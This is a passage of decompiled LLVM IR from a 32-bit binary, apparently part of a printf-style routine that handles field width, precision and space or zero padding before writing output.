  %v0_dd40 = phi i32 [ %v0_dc70, %bb157 ], [ %v2_dd08, %.thread17 ], [ %v0_dc70, %dec_label_pc_dd28 ], [ %v0_dc70, %bb159 ], [ %v0_dc70, %bb158 ]
  %v3_dd30 = load i32, i32* %stack_var_-348, align 4
  %v1_dd38 = icmp slt i32 %v3_dd30, 0
  br i1 %v1_dd38, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_dd30, %bb160 ]
  %v0_dd68 = phi i32 [ 1, %bb161 ], [ %v3_dd30, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_dd40 = and i32 %v0_dd40, 16
  %v2_dd40 = icmp eq i32 %v1_dd40, 0
  %v2_dd4c = sub i32 %v2_dce0, %v0_dd84
  store i32 %v2_dd4c, i32* @r5, align 4
  br i1 %v2_dd40, label %bb169, label %dec_label_pc_dd54

dec_label_pc_dd54:                                ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_dd54
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_dd54, %bb163
  br i1 %v7_dd60, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_dd68, %v2_dd4c
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_dd6c, label %dec_label_pc_dd74, label %bb169

dec_label_pc_dd74:                                ; preds = %bb167
  %v1_dd74 = inttoptr i32 %v0_dd84 to i8*
  %v2_dd74 = load i8, i8* %v1_dd74, align 1
  %v7_dd78 = icmp eq i8 %v2_dd74, 48
  br i1 %v7_dd78, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_dd74
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_dd74
  %v2_dd80 = add i32 %v2_dd4c, 1
  store i32 %v2_dd80, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_ddc4 = phi i32 [ %v0_dd68, %bb167 ], [ %v0_dd68, %bb162 ], [ 1, %bb168 ], [ %v2_dd80, %.thread24 ], [ %v0_dd68, %bb166 ]
  %v1_dd84 = inttoptr i32 %v0_dd84 to i8*
  %v2_dd84 = load i8, i8* %v1_dd84, align 1
  %v7_dd88 = icmp eq i8 %v2_dd84, 48
  br i1 %v7_dd88, label %dec_label_pc_dd90, label %dec_label_pc_ddc0

dec_label_pc_dd90:                                ; preds = %bb169
  %v0_dd94 = load i32, i32* @r6, align 4
  %v7_dd98 = icmp slt i32 %v0_dd94, 6
  br i1 %v7_dd98, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_dd90
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_dd90, %bb170
  br i1 %v7_dcb0, label %.thread27, label %dec_label_pc_ddb4

.thread27:                                        ; preds = %bb171
  store i32 142044, i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 104212, i32* @r4, align 4
  br label %dec_label_pc_ddcc

dec_label_pc_ddb4:                                ; preds = %bb171
  %v2_ddb4 = icmp eq i32 %v5_ddc4, 0
  br i1 %v2_ddb4, label %bb172, label %dec_label_pc_ddc0

bb172:                                            ; preds = %dec_label_pc_ddb4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_ddcc

dec_label_pc_ddc0:                                ; preds = %dec_label_pc_ddb4, %bb169
  %v2_ddc0 = sub i32 %v5_ddc4, %v2_dd4c
  %tmp211 = icmp ugt i32 %v5_ddc4, %v2_dd4c
  br i1 %tmp211, label %.thread85, label %dec_label_pc_ddcc

.thread85:                                        ; preds = %dec_label_pc_ddc0
  store i32 %v2_ddc0, i32* @r8, align 4
  br label %dec_label_pc_dfd8thread-pre-split

dec_label_pc_ddcc:                                ; preds = %dec_label_pc_ddc0, %.thread27, %bb172
  %v1_dfdc.pre205 = phi i32 [ %v2_dd4c, %dec_label_pc_ddc0 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_dfd8thread-pre-split

dec_label_pc_ddd4:                                ; preds = %dec_label_pc_dc38
  br i1 %tmp208, label %dec_label_pc_de14, label %dec_label_pc_dddc

dec_label_pc_dddc:                                ; preds = %dec_label_pc_ddd4
  %v3_ddec = load i32, i32* %stack_var_-72, align 4
  %v0_ddf0 = load i32, i32* @fp, align 4
  store i32 %v0_ddf0, i32* %r0.global-to-local, align 4
  %v1_ddf4 = inttoptr i32 %v3_ddec to i32*
  %v2_ddf4 = load i32, i32* %v1_ddf4, align 4
  store i32 %v2_ddf4, i32* %r2.global-to-local, align 4
  %v3_ddf4 = add i32 %v3_ddec, 4
  %v4_ddf4 = inttoptr i32 %v3_ddf4 to i32*
  %v5_ddf4 = load i32, i32* %v4_ddf4, align 4
  %v6_ddf8 = inttoptr i32 %v5_ddf4 to i32*
  %v7_ddf8 = call i32 @function_13584(i32 %v0_ddf0, i32 55804, i32 %v2_ddf4, i32* %v6_ddf8, i32 %v2_df88, i32 55804)
  store i32 %v7_ddf8, i32* %r0.global-to-local, align 4
  %v1_ddfc = icmp slt i32 %v7_ddf8, 0
  br i1 %v1_ddfc, label %dec_label_pc_e130, label %dec_label_pc_de04

dec_label_pc_de04:                                ; preds = %dec_label_pc_dddc
  %v2_de08 = add i32 %v7_ddf8, %v1_e008
  store i32 %v2_de08, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e11c

dec_label_pc_de14:                                ; preds = %dec_label_pc_ddd4
  br i1 %v3_de18, label %dec_label_pc_de9c, label %dec_label_pc_de1c

dec_label_pc_de1c:                                ; preds = %dec_label_pc_de14
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_de24 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_de24, i32* %r0.global-to-local, align 4
  br i1 %v7_de14, label %dec_label_pc_de2c, label %dec_label_pc_de64

dec_label_pc_de2c:                                ; preds = %dec_label_pc_de1c
  %v1_de2c = inttoptr i32 %v3_de24 to i32*
  %v2_de2c = load i32, i32* %v1_de2c, align 4
  %v9_de30 = icmp eq i32 %v2_de2c, 0
  store i32 %v2_de2c, i32* %stack_var_-44, align 4
  br i1 %v9_de30, label %dec_label_pc_dedc, label %dec_label_pc_de3c

dec_label_pc_de3c:                                ; preds = %dec_label_pc_de2c
  %v3_de3c = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_de40, i32* @r0, align 4
  %v4_de44 = ashr i32 %v3_de3c, 31
  %v5_de44 = or i32 %v4_de44, %v3_de3c
  store i32 %v5_de44, i32* %r2.global-to-local, align 4
  store i32 %v2_de40, i32* @r1, align 4
  %v6_de50 = call i32 @function_12fb8(i32 %v2_de40, i32 %v2_de40, i32 %v5_de44, i32 %v2_de4c, i32 0, i32 %v2_de2c)
  store i32 %v6_de50, i32* %r0.global-to-local, align 4
  %v3_de54 = icmp eq i32 %v6_de50, -1
  store i32 %v6_de50, i32* @r5, align 4
  br i1 %v3_de54, label %dec_label_pc_e130, label %dec_label_pc_dfc8

dec_label_pc_de64:                                ; preds = %dec_label_pc_de1c
  store i32 %v2_df44, i32* %r7.global-to-local, align 4
  %v1_de68 = inttoptr i32 %v3_de24 to i32*
  %v2_de68 = load i32, i32* %v1_de68, align 4
  store i32 %v2_de4c, i32* %r2.global-to-local, align 4
  store i32 %v2_df44, i32* %r0.global-to-local, align 4
  %v5_de74 = call i32 @function_12f64(i32 %v2_df44, i32 %v2_de68, i32 %v2_de4c, i32 %tmp105, i32 0)
  store i32 %v5_de74, i32* %r0.global-to-local, align 4
  %v7_de78 = icmp eq i32 %v5_de74, -1
  store i32 %v5_de74, i32* @r5, align 4
  br i1 %v7_de78, label %dec_label_pc_e130, label %dec_label_pc_de84

dec_label_pc_de84:                                ; preds = %dec_label_pc_de64
  %v0_de84 = load i32, i32* @sl, align 4
  store i32 %v0_de84, i32* @r8, align 4
  store i32 %v2_df44, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_de94 = trunc i32 %v0_de84 to i8
  %v2_de94 = load i32, i32* %r7.global-to-local, align 4
  %v4_de94 = add i32 %v2_de94, %v5_de74
  %v5_de94 = inttoptr i32 %v4_de94 to i8*
  store i8 %v1_de94, i8* %v5_de94, align 1
  %v0_dfdc.pre.pre = load i32, i32* @r8, align 4
  %v1_dfdc.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dfd8thread-pre-split

dec_label_pc_de9c:                                ; preds = %dec_label_pc_de14
  br i1 %v3_dea0, label %dec_label_pc_df38, label %dec_label_pc_dea4

dec_label_pc_dea4:                                ; preds = %dec_label_pc_de9c
  %v3_dea4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_dea4, i32* %r0.global-to-local, align 4
  %v1_deac = inttoptr i32 %v3_dea4 to i32*
  %v2_deac = load i32, i32* %v1_deac, align 4
  br i1 %v7_de9c, label %dec_label_pc_deac, label %dec_label_pc_df10

dec_label_pc_deac:                                ; preds = %dec_label_pc_dea4
  store i32 %v2_deac, i32* @r4, align 4
  %v2_deb0 = icmp eq i32 %v2_deac, 0
  br i1 %v2_deb0, label %dec_label_pc_dedc, label %dec_label_pc_deb8

dec_label_pc_deb8:                                ; preds = %dec_label_pc_deac, %dec_label_pc_df40
  %v0_debc = phi i32 [ %v2_deac, %dec_label_pc_deac ], [ %v3_df50, %dec_label_pc_df40 ]
  %v3_deb8 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_debc, i32* %r0.global-to-local, align 4
  %v4_dec0 = ashr i32 %v3_deb8, 31
  %v5_dec0 = or i32 %v4_dec0, %v3_deb8
  %v2_dec4 = inttoptr i32 %v0_debc to i8*
  %v3_dec4 = call i32 @function_f360(i8* %v2_dec4, i32 %v5_dec0)
  store i32 %v3_dec4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_dec4, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_dfd8

dec_label_pc_dedc:                                ; preds = %dec_label_pc_deac, %dec_label_pc_de2c
  %v3_dedc = load i32, i32* %stack_var_-348, align 4
  %v1_dee0 = icmp slt i32 %v3_dedc, 0
  br i1 %v1_dee0, label %dec_label_pc_def8, label %dec_label_pc_dee8

dec_label_pc_dee8:                                ; preds = %dec_label_pc_dedc
  %tmp212 = icmp ult i32 %v3_dedc, 6
  br i1 %tmp212, label %dec_label_pc_df00, label %dec_label_pc_def8

dec_label_pc_def8:                                ; preds = %dec_label_pc_dee8, %dec_label_pc_dedc
  br label %dec_label_pc_df00

dec_label_pc_df00:                                ; preds = %dec_label_pc_dee8, %dec_label_pc_def8
  %storemerge97 = phi i32 [ 6, %dec_label_pc_def8 ], [ 0, %dec_label_pc_dee8 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1971c.311 to i32), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_dfd8

dec_label_pc_df10:                                ; preds = %dec_label_pc_dea4
  store i32 %v2_deac, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_df44, i32* @r4, align 4
  store i32 %v2_deac, i32* %stack_var_-200, align 4
  br label %dec_label_pc_dfd8thread-pre-split

dec_label_pc_df38:                                ; preds = %dec_label_pc_de9c
  br i1 %v7_df38, label %dec_label_pc_df40, label %dec_label_pc_df5c

dec_label_pc_df40:                                ; preds = %dec_label_pc_df38
  %v0_df40 = call i32 @function_ce08()
  store i32 %v0_df40, i32* %r0.global-to-local, align 4
  %v1_df48 = inttoptr i32 %v0_df40 to i32*
  %v2_df48 = load i32, i32* %v1_df48, align 4
  store i32 %v2_df48, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_df50 = call i32 @function_f61c(i32 %v2_df48, i32 %v2_df44, i32 128)
  store i32 %v3_df50, i32* %r0.global-to-local, align 4
  store i32 %v3_df50, i32* @r4, align 4
  br label %dec_label_pc_deb8

dec_label_pc_df5c:                                ; preds = %dec_label_pc_df38
  %v4_df64 = load i32, i32* inttoptr (i32 142700 to i32*), align 4
  %v1_df6c = add i32 %v4_df64, 10
  store i32 %v1_df6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_df70

dec_label_pc_df70:                                ; preds = %dec_label_pc_dfb8, %dec_label_pc_df5c
  %v1_df80 = phi i32 [ %v1_dfb8, %dec_label_pc_dfb8 ], [ %v4_df64, %dec_label_pc_df5c ]
  %v1_df70 = inttoptr i32 %v1_df80 to i8*
  %v2_df70 = load i8, i8* %v1_df70, align 1
  %v3_df70 = zext i8 %v2_df70 to i32
  store i32 %v3_df70, i32* %r2.global-to-local, align 4
  %v9_df78 = icmp eq i32 %v3_df70, %tmp99
  br i1 %v9_df78, label %dec_label_pc_df80, label %dec_label_pc_dfb8

dec_label_pc_df80:                                ; preds = %dec_label_pc_df70
  %v2_df80 = sub i32 %v1_df80, %v4_df64
  %v0_df84 = load i32, i32* @fp, align 4
  store i32 %v0_df84, i32* %r0.global-to-local, align 4
  store i32 %v2_df8c, i32* %r2.global-to-local, align 4
  %v4_df94 = mul i32 %v2_df80, 4
  %v5_df94 = add i32 %v4_df94, 153416
  %v6_df94 = inttoptr i32 %v5_df94 to i32*
  %v7_df94 = load i32, i32* %v6_df94, align 4
  store i32 %v7_df94, i32* @ip, align 4
  store i32 57248, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_df94)
  %v0_dfa0 = load i32, i32* %r0.global-to-local, align 4
  %v1_dfa0 = icmp slt i32 %v0_dfa0, 0
  br i1 %v1_dfa0, label %dec_label_pc_e130, label %dec_label_pc_dfa8

dec_label_pc_dfa8:                                ; preds = %dec_label_pc_df80
  %v2_dfac = add i32 %v0_dfa0, %v1_e008
  br label %dec_label_pc_e11c

dec_label_pc_dfb8:                                ; preds = %dec_label_pc_df70
  %v1_dfb8 = add i32 %v1_df80, 1
  %v3_dfbc = icmp ult i32 %v1_dfb8, %v1_df6c
  br i1 %v3_dfbc, label %dec_label_pc_df70, label %dec_label_pc_e130

dec_label_pc_dfc8:                                ; preds = %dec_label_pc_de3c
  %v0_dfc8 = load i32, i32* @sl, align 4
  store i32 %v0_dfc8, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_dfc8, i32* @r4, align 4
  br label %dec_label_pc_dfd8

dec_label_pc_dfd8thread-pre-split:                ; preds = %.thread85, %dec_label_pc_ddcc, %dec_label_pc_de84, %dec_label_pc_df10
  %v1_dfdc.pre = phi i32 [ %v1_dfdc.pre205, %dec_label_pc_ddcc ], [ %v1_dfdc.pre.pre, %dec_label_pc_de84 ], [ 1, %dec_label_pc_df10 ], [ %v2_dd4c, %.thread85 ]
  %v0_dfdc.pre = phi i32 [ 0, %dec_label_pc_ddcc ], [ %v0_dfdc.pre.pre, %dec_label_pc_de84 ], [ 0, %dec_label_pc_df10 ], [ %v2_ddc0, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_dd40, %dec_label_pc_ddcc ], [ %v0_dc70, %dec_label_pc_de84 ], [ %v0_dc70, %dec_label_pc_df10 ], [ %v0_dd40, %.thread85 ]
  %v0_dfd8.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_dfd8

dec_label_pc_dfd8:                                ; preds = %dec_label_pc_dfd8thread-pre-split, %dec_label_pc_df00, %dec_label_pc_deb8, %dec_label_pc_dfc8
  %v1_dfdc = phi i32 [ %v1_dfdc.pre, %dec_label_pc_dfd8thread-pre-split ], [ %storemerge97, %dec_label_pc_df00 ], [ %v3_dec4, %dec_label_pc_deb8 ], [ %v6_de50, %dec_label_pc_dfc8 ]
  %v0_dfdc = phi i32 [ %v0_dfdc.pre, %dec_label_pc_dfd8thread-pre-split ], [ 0, %dec_label_pc_df00 ], [ 0, %dec_label_pc_deb8 ], [ %v0_dfc8, %dec_label_pc_dfc8 ]
  %v0_dfe4 = phi i32 [ %v0_dfd8.pr, %dec_label_pc_dfd8thread-pre-split ], [ 11, %dec_label_pc_df00 ], [ 11, %dec_label_pc_deb8 ], [ 11, %dec_label_pc_dfc8 ]
  %v0_e024 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_dfd8thread-pre-split ], [ %v0_dc70, %dec_label_pc_df00 ], [ %v0_dc70, %dec_label_pc_deb8 ], [ %v0_dc70, %dec_label_pc_dfc8 ]
  %v7_dfd8 = icmp eq i32 %v0_dfe4, 11
  %v2_dfdc = add i32 %v1_dfdc, %v0_dfdc
  br i1 %v7_dfd8, label %dec_label_pc_dff4, label %bb173

bb173:                                            ; preds = %dec_label_pc_dfd8
  %v7_dfec = icmp sgt i32 %v0_dfe4, 5
  %. = select i1 %v7_dfec, i32 2, i32 1
  %v2_dff0 = add i32 %v2_dfdc, %.
  br label %dec_label_pc_dff4

dec_label_pc_dff4:                                ; preds = %dec_label_pc_dfd8, %bb173
  %v0_e008 = phi i32 [ %v2_dfdc, %dec_label_pc_dfd8 ], [ %v2_dff0, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_dff8 = icmp uge i32 %tmp98, %v0_e008
  %v9_dff8 = icmp eq i32 %tmp98, %v0_e008
  %v2_dffc = xor i1 %v9_dff8, true
  %v3_dffc = and i1 %v3_dff8, %v2_dffc
  br i1 %v3_dffc, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_dff4
  %v2_dff8 = sub i32 %tmp98, %v0_e008
  store i32 %v2_dff8, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_dff4, %bb174
  store i32 %v1_e008, i32* %r2.global-to-local, align 4
  %v2_e004 = xor i1 %v3_dff8, true
  %v3_e004 = or i1 %v9_dff8, %v2_e004
  br i1 %v3_e004, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_e00c.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_e01c = phi i32 [ %v1_e00c.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_e008 = add i32 %v0_e008, %v1_e008
  %v2_e00c = add i32 %v2_e008, %v2_e01c
  %v0_e018 = load i32, i32* @sb, align 4
  %v7_e018 = icmp eq i32 %v0_e018, 48
  br i1 %v7_e018, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_e01c = add i32 %v2_e01c, %v0_dfdc
  store i32 %v3_e01c, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_e034 = phi i32 [ %v2_e01c, %bb177 ], [ 0, %bb178 ]
  %v1_e024 = and i32 %v0_e024, 8
  store i32 %v1_e024, i32* @r7, align 4
  %v2_e024 = icmp eq i32 %v1_e024, 0
  br i1 %v2_e024, label %dec_label_pc_e02c, label %dec_label_pc_e048

dec_label_pc_e02c:                                ; preds = %.thread30
  %v0_e02c = load i32, i32* @fp, align 4
  store i32 %v0_e02c, i32* %r0.global-to-local, align 4
  store i32 %v0_e034, i32* %r2.global-to-local, align 4
  %v4_e038 = call i32 @function_d9a8(i32 %v0_e02c, i8 32, i32 %v0_e034)
  store i32 %v4_e038, i32* %r0.global-to-local, align 4
  %v1_e03c = load i32, i32* @sl, align 4
  %v9_e03c = icmp eq i32 %v4_e038, %v1_e03c
  br i1 %v9_e03c, label %dec_label_pc_e044, label %dec_label_pc_e130

dec_label_pc_e044:                                ; preds = %dec_label_pc_e02c
  %v0_e044 = load i32, i32* @r7, align 4
  store i32 %v0_e044, i32* @sl, align 4
  %v0_e050.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e048

dec_label_pc_e048:                                ; preds = %.thread30, %dec_label_pc_e044
  %v0_e050 = phi i32 [ %v0_dfe4, %.thread30 ], [ %v0_e050.pre, %dec_label_pc_e044 ]
  %v0_e04c = load i32, i32* @fp, align 4
  %v2_e050 = add i32 %v0_e050, ptrtoint (i32* @global_var_19724.309 to i32)
  store i32 %v2_e050, i32* %r0.global-to-local, align 4
  %v2_e054 = call i32 @function_f150(i32 %v2_e050, i32 %v0_e04c)
  %v0_e058 = load i32, i32* @fp, align 4
  store i32 %v0_e058, i32* %r0.global-to-local, align 4
  %v0_e060 = load i32, i32* @r8, align 4
  store i32 %v0_e060, i32* %r2.global-to-local, align 4
  %v4_e064 = call i32 @function_d9a8(i32 %v0_e058, i8 48, i32 %v0_e060)
  store i32 %v4_e064, i32* %r0.global-to-local, align 4
  %v1_e068 = load i32, i32* @r8, align 4
  %v9_e068 = icmp eq i32 %v4_e064, %v1_e068
  br i1 %v9_e068, label %dec_label_pc_e070, label %dec_label_pc_e130

dec_label_pc_e070:                                ; preds = %dec_label_pc_e048
  %v3_e070 = load i32, i32* %stack_var_-44, align 4
  %v2_e074 = icmp eq i32 %v3_e070, 0
  br i1 %v2_e074, label %dec_label_pc_e07c, label %dec_label_pc_e0a0

dec_label_pc_e07c:                                ; preds = %dec_label_pc_e070
  %v0_e07c = load i32, i32* @r5, align 4
  %v2_e07c = icmp eq i32 %v0_e07c, 0
  br i1 %v2_e07c, label %dec_label_pc_e104, label %dec_label_pc_e084

dec_label_pc_e084:                                ; preds = %dec_label_pc_e07c
  %v0_e084 = load i32, i32* @r4, align 4
  store i32 %v0_e084, i32* %r0.global-to-local, align 4
  %v0_e08c = load i32, i32* @fp, align 4
  store i32 %v0_e08c, i32* %r2.global-to-local, align 4
  %v4_e090 = inttoptr i32 %v0_e08c to i16*
  %v5_e090 = call i32 @function_1317c(i32 %v0_e084, i32 %v0_e07c, i16* %v4_e090)
  store i32 %v5_e090, i32* %r0.global-to-local, align 4
  %v1_e094 = load i32, i32* @r5, align 4
  %v9_e094 = icmp eq i32 %v5_e090, %v1_e094
  br i1 %v9_e094, label %dec_label_pc_e104, label %dec_label_pc_e130

dec_label_pc_e0a0:                                ; preds = %dec_label_pc_e070
  store i32 %v2_df44, i32* @r6, align 4
  store i32 %v2_de40, i32* @r8, align 4
  store i32 %v2_de4c, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_e0f0.pr = load i32, i32* @r5, align 4
  %v2_e0f041 = icmp eq i32 %v0_e0f0.pr, 0
  store i32 %v2_de40, i32* @r1, align 4
  store i32 %v2_df44, i32* @r0, align 4
  br i1 %v2_e0f041, label %dec_label_pc_e104, label %dec_label_pc_e0b8

dec_label_pc_e0b8:                                ; preds = %dec_label_pc_e0a0, %dec_label_pc_e0ec
  %v1_e0bc = phi i32 [ %v2_e0ec, %dec_label_pc_e0ec ], [ %v0_e0f0.pr, %dec_label_pc_e0a0 ]
  %v2_e0b8 = icmp ult i32 %v1_e0bc, 128
  %.v1_e0bc = select i1 %v2_e0b8, i32 %v1_e0bc, i32 128
  store i32 %.v1_e0bc, i32* %r2.global-to-local, align 4
  %v6_e0c4 = call i32 @function_12fb8(i32 %v2_df44, i32 %v2_de40, i32 %.v1_e0bc, i32 %v2_de4c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_e0c4, i32* @r4, align 4
  %v2_e0c8 = icmp eq i32 %v6_e0c4, 0
  store i32 %v6_e0c4, i32* %r0.global-to-local, align 4
  br i1 %v2_e0c8, label %dec_label_pc_e0ec, label %dec_label_pc_e0d4

dec_label_pc_e0d4:                                ; preds = %dec_label_pc_e0b8
  store i32 %v2_df44, i32* %r0.global-to-local, align 4
  %v0_e0dc = load i32, i32* @fp, align 4
  store i32 %v0_e0dc, i32* %r2.global-to-local, align 4
  %v3_e0e0 = inttoptr i32 %v0_e0dc to i16*
  %v4_e0e0 = call i32 @function_1317c(i32 %v2_df44, i32 %v6_e0c4, i16* %v3_e0e0)
  store i32 %v4_e0e0, i32* %r0.global-to-local, align 4
  %v1_e0e4 = load i32, i32* @r4, align 4
  %v9_e0e4 = icmp eq i32 %v4_e0e0, %v1_e0e4
  br i1 %v9_e0e4, label %dec_label_pc_e0ec, label %dec_label_pc_e130

dec_label_pc_e0ec:                                ; preds = %dec_label_pc_e0d4, %dec_label_pc_e0b8
  %v0_e0ec = phi i32 [ %v4_e0e0, %dec_label_pc_e0d4 ], [ 0, %dec_label_pc_e0b8 ]
  %v1_e0ec = load i32, i32* @r5, align 4
  %v2_e0ec = sub i32 %v1_e0ec, %v0_e0ec
  store i32 %v2_e0ec, i32* @r5, align 4
  %v2_e0f0 = icmp eq i32 %v2_e0ec, 0
  store i32 %v2_de40, i32* @r1, align 4
  store i32 %v2_df44, i32* @r0, align 4
  br i1 %v2_e0f0, label %dec_label_pc_e104, label %dec_label_pc_e0b8

dec_label_pc_e104:                                ; preds = %dec_label_pc_e0ec, %dec_label_pc_e0a0, %dec_label_pc_e084, %dec_label_pc_e07c
  %v0_e104 = load i32, i32* @fp, align 4
  store i32 %v0_e104, i32* %r0.global-to-local, align 4
  %v0_e10c = load i32, i32* @sl, align 4
  store i32 %v0_e10c, i32* %r2.global-to-local, align 4
  %v4_e110 = call i32 @function_d9a8(i32 %v0_e104, i8 32, i32 %v0_e10c)
  store i32 %v4_e110, i32* %r0.global-to-local, align 4
  %v1_e114 = load i32, i32* @sl, align 4
  %v9_e114 = icmp eq i32 %v4_e110, %v1_e114
  br i1 %v9_e114, label %dec_label_pc_e11c, label %dec_label_pc_e130

dec_label_pc_e11c:                                ; preds = %dec_label_pc_e104, %dec_label_pc_dfa8, %dec_label_pc_de04, %dec_label_pc_dc14
  %stack_var_-336.4 = phi i32 [ %v0_dc70, %dec_label_pc_dc14 ], [ %v0_e024, %dec_label_pc_e104 ], [ %v0_dc70, %dec_label_pc_dfa8 ], [ %v0_dc70, %dec_label_pc_de04 ]
  %stack_var_-356.3 = phi i32 [ %v1_e008, %dec_label_pc_dc14 ], [ %v2_e00c, %dec_label_pc_e104 ], [ %v2_dfac, %dec_label_pc_dfa8 ], [ %v2_de08, %dec_label_pc_de04 ]
  %v3_e11c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_e11c, i32* @r4, align 4
  store i32 %v3_e11c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_db3c.outer

dec_label_pc_e128:                                ; preds = %dec_label_pc_db98
  %v1_e128 = add i32 %v0_dba0, 2
  store i32 %v1_e128, i32* @r4, align 4
  br label %dec_label_pc_db3c.outer36

dec_label_pc_e130:                                ; preds = %dec_label_pc_dfb8, %dec_label_pc_de3c, %dec_label_pc_e104, %dec_label_pc_e084, %dec_label_pc_e048, %dec_label_pc_e02c, %dec_label_pc_df80, %dec_label_pc_de64, %dec_label_pc_dddc, %bb142, %dec_label_pc_e0d4
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_e138

dec_label_pc_e138:                                ; preds = %dec_label_pc_db8c, %bb, %dec_label_pc_dad0, %dec_label_pc_e130
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_dad0 ], [ -1, %dec_label_pc_e130 ], [ %v1_e008, %dec_label_pc_db8c ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_da80, i32* @r5, align 4
  store i32 %v12_da80, i32* %r7.global-to-local, align 4
  store i32 %v18_da80, i32* @sb, align 4
  store i32 %v21_da80, i32* @sl, align 4
  store i32 %v24_da80, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_e128, { 1, 0 }
  uselistorder i32 %v3_e11c, { 1, 2, 0 }
  uselistorder i32 %v2_e0ec, { 1, 2, 0 }
  uselistorder i32 %v0_e034, { 1, 0 }
  uselistorder i32 %v2_e01c, { 2, 0, 1 }
  uselistorder i1 %v9_dff8, { 1, 0 }
  uselistorder i32 %v2_dfdc, { 1, 0 }
  uselistorder i32 %v0_e024, { 1, 0 }
  uselistorder i32 %v0_dfdc, { 1, 0 }
  uselistorder i32 %v1_dfb8, { 1, 0 }
  uselistorder i32 %v1_df80, { 1, 0, 2 }
  uselistorder i32 %v3_df50, { 1, 2, 0 }
  uselistorder i32 %v0_debc, { 1, 0 }
  uselistorder i32 %v2_deac, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_de74, { 1, 2, 0, 3 }
  uselistorder i32 %v3_ddec, { 1, 0 }
  uselistorder i32 %v2_dd4c, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_dd68, { 1, 2, 3, 0 }
  uselistorder i32 %v2_dce8, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_dc50, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v1_dbf4.pre, { 1, 0, 2 }
  uselistorder i32 %v1_dbec, { 1, 0 }
  uselistorder i32 %v1_db98, { 0, 1, 3, 2 }
  uselistorder i32 %v1_e008, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_db58, { 1, 0 }
  uselistorder i32 %v1_db50.lcssa, { 1, 0 }
  uselistorder i8 %v2_db3c, { 1, 0 }
